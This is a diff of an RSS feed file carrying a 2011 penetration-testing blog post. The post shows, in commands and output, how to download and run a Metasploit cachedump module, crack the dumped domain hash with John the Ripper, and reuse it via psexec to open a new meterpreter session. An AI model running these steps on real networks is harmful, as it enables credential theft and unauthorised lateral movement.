@@ -17,18 +17,11 @@
       
       <guid>https://malicious.link/post/2011/2011-02-14-cachedump-for-meterpreter-in-action/</guid>
       <description>&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Cachedump has been added to the Metasploit trunk:&lt;/p&gt;
-
 &lt;p&gt;&lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946&#34;&gt;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;Pull it down:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;wget http://lab.mediaservice.net/code/cachedump.rb
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;put it here:  &lt;code&gt;/(metasploitdir)/modules/post/windows/gather&lt;/code&gt;&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;put it here:  &lt;code&gt;/(metasploitdir)/modules/post/windows/gather&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/cachedump
 [*] Executing module against WORKSTATION244
 [*] Obtaining the boot key...
@@ -55,18 +48,12 @@ jdoe:592cdfbc3f1ef77ae95c75f851e37166:CONTOSO.CO:CONTOS
 
 [*] Hash are in MSCACHE format. (mscash)
 meterpreter &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Crack it:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Crack it:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;cat lab.dic | ./john --stdin lab.mscash --format=mscash --pot=lab.pot  
 Loaded 1 password hash (M$ Cache Hash [Generic 1x])  
 ASDqwe123  (jdoe)  
 guesses: 1  time: 0:00:00:00  c/s: 500  trying: ASDqwe123
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Use it:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Use it:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; background  
 msf exploit(handler) &amp;gt; route add 10.10.10.0 255.255.255.0 1  
 msf exploit(handler) &amp;gt; use exploit/windows/smb/psexec  
@@ -131,9 +118,7 @@ msf exploit(psexec) &amp;gt; exploit
 [*] Closing service handle...  
 [*] Deleting jSlxARUj.exe...  
 [*] Meterpreter session 2 opened (X.X.X.X:80 -&amp;gt; X.X.X.X:54430) at Mon Feb 14 22:23:00 +0000 2011
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Woot ;-)&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Woot ;-)&lt;/p&gt;
 </description>
     </item>
     
